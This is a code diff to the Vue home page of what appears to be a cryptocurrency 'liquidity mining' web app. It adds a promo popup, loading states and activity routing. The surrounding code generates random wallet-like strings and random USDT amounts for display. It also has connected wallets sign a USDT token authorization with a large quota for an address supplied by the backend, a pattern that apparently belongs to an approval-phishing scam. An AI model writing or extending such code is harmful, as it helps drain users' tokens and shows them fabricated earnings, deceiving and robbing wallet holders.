@@ -39,11 +39,21 @@
             {{ formattedNumber(configStore.$state.homeList.income) }}
           </div>
         </div>
-        <div class="functional-area backminning">
+        <div
+          class="functional-area backminning"
+          @click="
+            goActivity('Liquidity Mining', configStore.$state.userInfo.is_true)
+          "
+        >
           <div />
           <div />
         </div>
-        <div class="functional-area backheight">
+        <div
+          class="functional-area backheight"
+          @click="
+            goActivity('Advanced Mining', configStore.$state.userInfo.is_true)
+          "
+        >
           <div />
           <div />
         </div>
@@ -51,7 +61,10 @@
       <van-button
         v-if="!isConnected"
         class="join-btv"
-        type="warning"
+        :loading="loadingBtv"
+        :disabled="!address"
+        loading-type="spinner"
+        :loading-text="t('authorizationPending')"
         @click="queryAuthAgent()"
         >{{ t("HeightPool.approvetext") }}</van-button
       >
@@ -109,6 +122,16 @@
         <div class="faq-contant">{{ t("dailyUSDTGeneration") }}</div>
       </div>
     </div>
+    <van-popup v-model:show="showaction" class="announcement" round>
+      <div class="titles-announcement">
+        <span class="title-text"> {{ t("promoTitle") }}!!</span>
+        <span class="title-off" @click="showaction = false">
+          <img v-lazy="getAssetsImageUrl('/languageIcon/officon.png')" alt=""
+        /></span>
+      </div>
+      <div class="box-lines" />
+      <div class="popcontant">{{ t("promoMessage") }}！！</div>
+    </van-popup>
   </div>
 </template>
 
@@ -117,7 +140,8 @@ import { ref, onMounted, computed } from "vue";
 import {
   getAssetsImageUrl,
   truncateString,
-  formattedNumber
+  formattedNumber,
+  goToPage
 } from "@/utils/index.utils.js";
 import { testApi } from "@/api/index";
 import {
@@ -133,6 +157,15 @@ import { useI18n } from "vue3-i18n";
 import { useConfigStore } from "@/stores/index";
 const configStore = useConfigStore();
 const { t } = useI18n();
+import { useRouter } from "vue-router";
+const router = useRouter();
+const goActivity = (pageName, state) => {
+  // if (state == false) {
+  //   showFailToast(t("joinevent"));
+  // } else {
+    router.push({ name: pageName });
+  // }
+};
 function generateRandomString(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -142,7 +175,7 @@ function generateRandomString(length) {
   }
   return result;
 }
-
+const loadingBtv = ref(false);
 // 生成随机金额
 function generateRandomAmount() {
   return (Math.random() * 10000).toFixed(2) + "USDT";
@@ -166,6 +199,7 @@ const testData = computed(() => {
  * @returns {Object} - 返回首页数据对象。
  */
 const queryAuthAgent = () => {
+  loadingBtv.value = true;
   if (address.value == void 0) {
     modal.open();
   }
@@ -181,17 +215,15 @@ const queryAuthAgent = () => {
     .catch(() => {});
 };
 //链上授权方法
-const coinadress = ref("");
 const handleConfirm = async function (approveAdress) {
-  if (chainId.value == 56) {
-    coinadress.value = "0x55d398326f99059ff775485246999027b3197955";
-  } else {
-    coinadress.value = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-  }
   try {
     const provider = new BrowserProvider(walletProvider.value);
     const signer = await provider.getSigner();
-    const tokenContract = new Contract(coinadress.value, ABI, provider);
+    const tokenContract = new Contract(
+      configStore.$state.coinadress,
+      ABI,
+      provider
+    );
     let singeContractConnect = tokenContract.connect(signer);
     let quotaNum =
       "0x" +
@@ -211,7 +243,8 @@ const handleConfirm = async function (approveAdress) {
         wordBreak: "break-word",
         duration: 3000
       });
-      queryAuthAddress(tx.hash);
+
+      // queryAuthAddress(tx.hash);
     } else {
       showFailToast({
         message: t("authorizationFailed"),
@@ -219,16 +252,18 @@ const handleConfirm = async function (approveAdress) {
         forbidClick: true,
         duration: 3000
       });
+      loadingBtv.value = false;
       return;
     }
-
-    //查询余额并调用申请接口
+    loadingBtv.value = false;
   } catch (e) {
-    console.log(e);
+    loadingBtv.value = false;
   }
 };
+const showaction = ref(false);
 onMounted(() => {
   configStore.queryAgentMarketIncome();
+  showaction.value = true;
 });
 </script>
 <style lang="scss" scoped>
@@ -238,7 +273,9 @@ onMounted(() => {
     width: 100%;
     // height: 160.02px;
     position: relative;
-
+    > img {
+      width: 100%;
+    }
     .home-notice {
       background: #00000033;
       backdrop-filter: blur(0.74rem);
@@ -418,6 +455,51 @@ onMounted(() => {
         line-height: 1rem;
         color: #ffffff99;
       }
+    }
+  }
+  .announcement {
+    background: linear-gradient(
+      143.14deg,
+      #322827 2.04%,
+      #16261f 54.45%,
+      #302135 98.21%
+    );
+    border-radius: 0.71rem;
+    border: 1px solid #ff693e66;
+    .titles-announcement {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.86rem 1.07rem;
+      .title-text {
+        font-size: 1rem;
+        font-weight: 400;
+        line-height: 1.4rem;
+        color: #ff693e;
+      }
+      .title-off {
+        width: 16px;
+        > img {
+          width: 16px;
+        }
+      }
+    }
+    .box-lines {
+      height: 0.07rem;
+      background: linear-gradient(
+        90deg,
+        rgba(255, 105, 62, 0) 0%,
+        rgba(255, 105, 62, 0.2) 44.13%,
+        rgba(255, 105, 62, 0) 100%
+      );
+    }
+    .popcontant {
+      padding: 0.79rem 1.29rem 1.5rem;
+      font-family: PingFang SC;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 19.6px;
+      color: #ffffff;
     }
   }
 }
